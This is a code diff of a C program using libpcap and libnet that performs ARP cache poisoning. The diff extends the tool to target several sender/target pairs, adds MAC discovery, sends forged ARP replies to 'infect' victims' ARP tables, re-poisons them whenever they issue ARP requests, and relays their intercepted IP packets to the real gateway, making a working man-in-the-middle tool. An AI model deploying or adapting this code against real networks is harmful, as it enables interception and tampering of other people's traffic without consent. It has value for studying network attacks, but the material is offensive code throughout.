@@ -37,6 +37,11 @@ int mac_cmp(uint8_t* m1, uint8_t* m2){
   }
   return 0;
 }
+void set_eth_hdr(struct libnet_ethernet_hdr* eth_hdr, uint8_t* ether_dhost, uint8_t* ether_shost, uint16_t ether_type){
+  memcpy(eth_hdr->ether_dhost, ether_dhost, MAC_ADDRESS_LEN);
+  memcpy(eth_hdr->ether_shost, ether_shost, MAC_ADDRESS_LEN);
+  eth_hdr->ether_type = ether_type;
+}
 void eth_hdr_to_packet(uint8_t* packet, struct libnet_ethernet_hdr* eth_hdr){
   memcpy(packet, eth_hdr->ether_dhost, MAC_ADDRESS_LEN);
   memcpy(packet + MAC_ADDRESS_LEN, eth_hdr->ether_shost, MAC_ADDRESS_LEN);
@@ -118,56 +123,52 @@ int packet_to_ip_hdr(const uint8_t* p, struct libnet_ipv4_hdr* ip_hdr){
   }
   return 0;
 }
-
-// discover victim's mac by request -> infecting!
-int arp_infect(int initialized, pcap_t* handle, struct in_addr sender_ip, struct in_addr target_ip, struct in_addr my_ip, uint8_t* sender_mac, uint8_t* target_mac, uint8_t* my_mac) {
-  if(!initialized){
-    printf("[+] Broadcast a request of sender's mac address...\n");
-    libnet_ethernet_hdr request_eth_hdr;
-    memcpy(request_eth_hdr.ether_shost, my_mac, MAC_ADDRESS_LEN);
-    memset(request_eth_hdr.ether_dhost, 0xff, MAC_ADDRESS_LEN);
-    request_eth_hdr.ether_type = ETHERTYPE_ARP;
-    uint8_t request_sender_mac[6], request_target_mac[6];
-    struct in_addr request_sender_ip, request_target_ip;
-    memcpy(request_sender_mac, my_mac, MAC_ADDRESS_LEN);
-    memset(request_target_mac, 0x00, MAC_ADDRESS_LEN);
-    request_sender_ip.s_addr = my_ip.s_addr;
-    request_target_ip.s_addr = sender_ip.s_addr;
-    uint8_t request_packet[ETHERNET_HEADER_LEN + ARP_HEADER_LEN];
-    eth_hdr_to_packet(request_packet, &request_eth_hdr);
-    arp_hdr_to_packet(request_packet+ETHERNET_HEADER_LEN, ARPOP_REQUEST, request_sender_mac, request_sender_ip, request_target_mac, request_target_ip);
-    pcap_sendpacket(handle, request_packet, ETHERNET_HEADER_LEN + ARP_HEADER_LEN);
-    printf("[+] Done\n\n");
-    // parse Ethernet header
-    printf("[+] Waiting for reply..\n");
-    libnet_ethernet_hdr eth_hdr;
-    libnet_arp_hdr arp_hdr;
-    struct in_addr sender_ip, target_ip;
-    while(1){
-      struct pcap_pkthdr *header;
-      const uint8_t *packet;
-      int res = pcap_next_ex(handle, &header, &packet);
-      if (res == 0) continue;
-      if (res == -1 || res == -2){
-        printf("[!] An error has been occured. Terminated");
-        return -1;
-      }
-      int len = header->caplen;
-      if (len < ETHERNET_HEADER_LEN+ARP_HEADER_LEN) continue;
-      packet_to_eth_hdr(packet, &eth_hdr);
-      if(eth_hdr.ether_type != ETHERTYPE_ARP) continue;
-      // parse ARP header
-      if(packet_to_arp_hdr(packet+ETHERNET_HEADER_LEN,&arp_hdr, sender_mac, &sender_ip, target_mac, &target_ip) == -1) continue;
-      if (arp_hdr.ar_op != ARPOP_REPLY) continue;
-      if(sender_ip.s_addr == sender_ip.s_addr) break;
+int discover_mac(pcap_t* handle, struct in_addr ip, struct in_addr my_ip, uint8_t* mac, uint8_t* my_mac){
+  printf("[+] Broadcasting a request mac address of "); print_ip(ip);
+  libnet_ethernet_hdr request_eth_hdr;
+  uint8_t broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+  set_eth_hdr(&request_eth_hdr, broadcast_mac, my_mac, ETHERTYPE_ARP);
+  uint8_t request_sender_mac[6], request_target_mac[6];
+  struct in_addr request_sender_ip, request_target_ip;
+  memcpy(request_sender_mac, my_mac, MAC_ADDRESS_LEN);
+  memset(request_target_mac, 0x00, MAC_ADDRESS_LEN);
+  request_sender_ip.s_addr = my_ip.s_addr;
+  request_target_ip.s_addr = ip.s_addr;
+  uint8_t request_packet[ETHERNET_HEADER_LEN + ARP_HEADER_LEN];
+  eth_hdr_to_packet(request_packet, &request_eth_hdr);
+  arp_hdr_to_packet(request_packet+ETHERNET_HEADER_LEN, ARPOP_REQUEST, request_sender_mac, request_sender_ip, request_target_mac, request_target_ip);
+  pcap_sendpacket(handle, request_packet, ETHERNET_HEADER_LEN + ARP_HEADER_LEN);
+  printf("[+] Done\n\n");
+  printf("[+] Waiting for reply..\n");
+  libnet_ethernet_hdr eth_hdr;
+  libnet_arp_hdr arp_hdr;
+  struct in_addr sender_ip, target_ip;
+  while(1){
+    struct pcap_pkthdr *header;
+    const uint8_t *packet;
+    int res = pcap_next_ex(handle, &header, &packet);
+    if (res == 0) continue;
+    if (res == -1 || res == -2){
+      printf("[!] An error has been occured. Terminated");
+      return -1;
     }
-    printf("[+] Done. sender's mac : "); print_mac(sender_mac); printf("\n");
+    int len = header->caplen;
+    if (len < ETHERNET_HEADER_LEN+ARP_HEADER_LEN) continue;
+    packet_to_eth_hdr(packet, &eth_hdr);
+    if(eth_hdr.ether_type != ETHERTYPE_ARP) continue;
+    // parse ARP header
+    uint8_t dummy_mac[MAC_ADDRESS_LEN];
+    if(packet_to_arp_hdr(packet+ETHERNET_HEADER_LEN,&arp_hdr, mac, &sender_ip, dummy_mac, &target_ip) == -1) continue;
+    if (arp_hdr.ar_op != ARPOP_REPLY) continue;
+    if(sender_ip.s_addr == ip.s_addr) break;
   }
-  printf("[+] Infecting sender's arp table\n");
+  printf("[+] Done. mac address : "); print_mac(mac); printf("\n");  
+}
+// discover victim's mac by request -> infecting!
+int arp_infect(pcap_t* handle, struct in_addr sender_ip, struct in_addr target_ip, struct in_addr my_ip, uint8_t* sender_mac, uint8_t* target_mac, uint8_t* my_mac) {
+  printf("[+] Infecting sender's arp table. **Sender : "); print_ip(sender_ip);
   libnet_ethernet_hdr forgy_eth_hdr;
-  memcpy(forgy_eth_hdr.ether_dhost, sender_mac, MAC_ADDRESS_LEN);
-  memcpy(forgy_eth_hdr.ether_shost, my_mac, MAC_ADDRESS_LEN);
-  forgy_eth_hdr.ether_type = ETHERTYPE_ARP;
+  set_eth_hdr(&forgy_eth_hdr,sender_mac, my_mac, ETHERTYPE_ARP);
   libnet_arp_hdr forgy_arp_hdr;
   forgy_arp_hdr.ar_hrd = ARPHRD_ETHER;
   forgy_arp_hdr.ar_pro = ETHERTYPE_IP;
@@ -175,8 +176,7 @@ int arp_infect(int initialized, pcap_t* handle, struct in_addr sender_ip, struct
   forgy_arp_hdr.ar_pln = IP_ADDRESS_LEN;
   uint8_t forgy_sender_mac[MAC_ADDRESS_LEN], forgy_target_mac[MAC_ADDRESS_LEN];
   struct in_addr forgy_sender_ip, forgy_target_ip;
-//  memset(forgy_sender_mac, 0x11, MAC_ADDRESS_LEN); // forgy!!!!!
-  memcpy(forgy_sender_mac, my_mac, MAC_ADDRESS_LEN);
+  memcpy(forgy_sender_mac, my_mac, MAC_ADDRESS_LEN); // forgy!!!!
   memcpy(forgy_target_mac, sender_mac, MAC_ADDRESS_LEN);
   forgy_sender_ip.s_addr = target_ip.s_addr;
   forgy_target_ip.s_addr = sender_ip.s_addr;
@@ -192,12 +192,24 @@ int arp_infect(int initialized, pcap_t* handle, struct in_addr sender_ip, struct
   return 0;
 }
 
-// when sender request mac address of target, reply forgy mac address to sender. I hope it will be used someday....:(
-void forgy_arp_response_feedback(pcap_t* handle, struct in_addr sender_ip, struct in_addr target_ip, struct in_addr my_ip, uint8_t* my_mac) {
+void forgy_arp_response_feedback(pcap_t* handle, struct in_addr* sender_ip, struct in_addr* target_ip, int pair, struct in_addr my_ip, uint8_t* my_mac) {
   // infect & gathering sender/target's mac address
-  uint8_t sender_mac[MAC_ADDRESS_LEN] = {};
-  uint8_t target_mac[MAC_ADDRESS_LEN] = {};
-  if (arp_infect(0, handle, sender_ip, target_ip, my_ip, sender_mac, target_mac, my_mac) == -1) return;
+  uint8_t sender_mac[pair][MAC_ADDRESS_LEN] = {};
+  uint8_t target_mac[pair][MAC_ADDRESS_LEN] = {};
+  printf("[+] 1. ------------------- Discover mac ----------------------\n");
+  for(int i = 0; i < pair; i++){
+    discover_mac(handle, sender_ip[i], my_ip, sender_mac[i], my_mac);
+    discover_mac(handle, target_ip[i], my_ip, target_mac[i], my_mac);
+  }
+  printf("---------------------------------------------------------------\n\n");
+  printf("[+] 2. ------------------- Infect a sender --------------------\n");
+  for(int i = 0; i < pair; i++){
+    if (arp_infect(handle, sender_ip[i], target_ip[i], my_ip, sender_mac[i], target_mac[i], my_mac) == -1) return;
+  }
+  printf("---------------------------------------------------------------\n\n");
+
+  printf("[+] 3. ----------------------- Spoof!!! --------------------\n");
+
   // parse Ethernet header
   while(1){
     struct pcap_pkthdr* header;
@@ -213,15 +225,23 @@ void forgy_arp_response_feedback(pcap_t* handle, struct in_addr sender_ip, struc
     if (len < ETHERNET_HEADER_LEN) continue;
     packet_to_eth_hdr(p, &eth_hdr);
     if(eth_hdr.ether_type == ETHERTYPE_IP){
-      if(mac_cmp(eth_hdr.ether_shost, sender_mac) == 0 and mac_cmp(eth_hdr.ether_dhost, my_mac) == 0){
-        libnet_ipv4_hdr ip_header;
-        printf("[+] Analyze spoofed IP packet\n");
-        if(packet_to_ip_hdr(p+ETHERNET_HEADER_LEN, &ip_header) == -1) continue;
-        printf("[+] source mac : "); print_mac(eth_hdr.ether_shost);
-        printf("[+] dest   mac : "); print_mac(eth_hdr.ether_dhost);
-        printf("[+] source IP  : "); print_ip(ip_header.ip_src);
-        printf("[+] dest   IP  : "); print_ip(ip_header.ip_dst);
-        printf("\n");
+      for(int i = 0; i < pair; i++){
+        if(mac_cmp(eth_hdr.ether_shost, sender_mac[i]) == 0 and mac_cmp(eth_hdr.ether_dhost, my_mac) == 0){
+          libnet_ipv4_hdr ip_header;
+          printf("[+] Analyze spoofed IP packet\n");
+          if(packet_to_ip_hdr(p+ETHERNET_HEADER_LEN, &ip_header) == -1) continue;
+          printf("[+] source IP  : "); print_ip(ip_header.ip_src);
+          printf("[+] dest   IP  : "); print_ip(ip_header.ip_dst);
+          printf("\n");
+          uint8_t relay_packet[header->caplen];
+          libnet_ethernet_hdr relay_eth_hdr;
+          set_eth_hdr(&relay_eth_hdr, target_mac[i], my_mac, ETHERTYPE_IP);
+          memcpy(relay_packet, p, header->caplen);
+          eth_hdr_to_packet(relay_packet, &relay_eth_hdr);
+          printf("[+] Sending replay packet\n");
+          pcap_sendpacket(handle, relay_packet, header->caplen);
+          printf("[+] done.\n\n");
+        }
       }
     }
     else if(eth_hdr.ether_type == ETHERTYPE_ARP){
@@ -231,12 +251,16 @@ void forgy_arp_response_feedback(pcap_t* handle, struct in_addr sender_ip, struc
       uint8_t arp_sender_mac[6], arp_target_mac[6];
       struct in_addr arp_sender_ip, arp_target_ip;
       if(packet_to_arp_hdr(p+ETHERNET_HEADER_LEN,&arp_hdr, arp_sender_mac, &arp_sender_ip, arp_target_mac, &arp_target_ip) == -1) continue;
-      if(arp_sender_ip.s_addr == sender_ip.s_addr and arp_target_ip.s_addr == target_ip.s_addr)
-        printf("[+] sender requests target's address\n");
-      else if(arp_sender_ip.s_addr == target_ip.s_addr )//and is_broadcast_mac(eth_hdr.ether_dhost))
-        printf("[+] target requests someone's address\n");
-      else continue;
-      arp_infect(1, handle, sender_ip, target_ip, my_ip, sender_mac, target_mac, my_mac);
+      for(int i = 0; i < pair; i++){
+        if(arp_sender_ip.s_addr == sender_ip[i].s_addr and arp_target_ip.s_addr == target_ip[i].s_addr){
+          printf("[+] sender requests target's address. **sender : "); print_ip(sender_ip[i]);
+        }
+        else if(arp_sender_ip.s_addr == target_ip[i].s_addr ){//and is_broadcast_mac(eth_hdr.ether_dhost))
+          printf("[+] target requests someone's address. **target : "); print_ip(target_ip[i]);
+        }
+        else continue;
+        arp_infect(handle, sender_ip[i], target_ip[i], my_ip, sender_mac[i], target_mac[i], my_mac);
+      }
     }
   }
 }
@@ -286,41 +310,46 @@ int get_my_addr(char* dev, struct in_addr* my_ip, uint8_t* my_mac){
   else return -1;
 }
 void usage() {
-  printf("syntax: pcap_test <interface> <send ip> <target ip>\n");
-  printf("sample: pcap_test wlan0 192.168.43.57 192.168.43.1\n");
+  printf("syntax: pcap_test <interface> <send ip 1> <target ip 1> <send ip 2> <target ip 2> <send ip 3> <target ip 3> ... \n");
+  printf("sample: pcap_test wlan0 192.168.43.57 192.168.43.1 192.168.43.6 192.168.43.28\n");
 }
 
 int main(int argc, char *argv[]) {
-  if (argc != 4) {
+  if (argc == 2 or argc % 2 == 1) {
     usage();
     return -1;
   }
 
   char *dev = argv[1];
   char errbuf[PCAP_ERRBUF_SIZE];
-  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
   
   //pcap_t *handle = pcap_open_offline("20180927_arp.pcap", errbuf);
   if (handle == NULL) {
     fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
     return -1;
   }
+  int pair = (argc-2) / 2;
+  printf("pair : %d\n",pair);
   struct in_addr my_ip;
   uint8_t my_mac[6];
+  for(int i = 0; i < pair; i++){}
   if(get_my_addr(dev, &my_ip, my_mac) == -1){
     fprintf(stderr, "couldn't find ip/mac address\n");
     return -1;
   }
   printf("my ip : "); print_ip(my_ip);
   printf("my mac : "); print_mac(my_mac);
-  struct in_addr sender_ip, target_ip;
-  if(!inet_aton(argv[2], &sender_ip) or !inet_aton(argv[3], &target_ip)){
-    fprintf(stderr, "wrong send ip or target ip\n");
-    return -1;
+  struct in_addr sender_ip[pair], target_ip[pair];
+  for(int i = 0; i < pair; i++){
+    if(!inet_aton(argv[2*i+2], &sender_ip[i]) or !inet_aton(argv[2*i+3], &target_ip[i])){
+      fprintf(stderr, "wrong send ip or target ip\n");
+      return -1;
+    }
+    sender_ip[i].s_addr = htonl(sender_ip[i].s_addr);
+    target_ip[i].s_addr = htonl(target_ip[i].s_addr);
   }
-  sender_ip.s_addr = htonl(sender_ip.s_addr);
-  target_ip.s_addr = htonl(target_ip.s_addr);
-  forgy_arp_response_feedback(handle, sender_ip, target_ip, my_ip, my_mac);
+  forgy_arp_response_feedback(handle, sender_ip, target_ip, pair, my_ip, my_mac);
 
   pcap_close(handle);
   return 0;
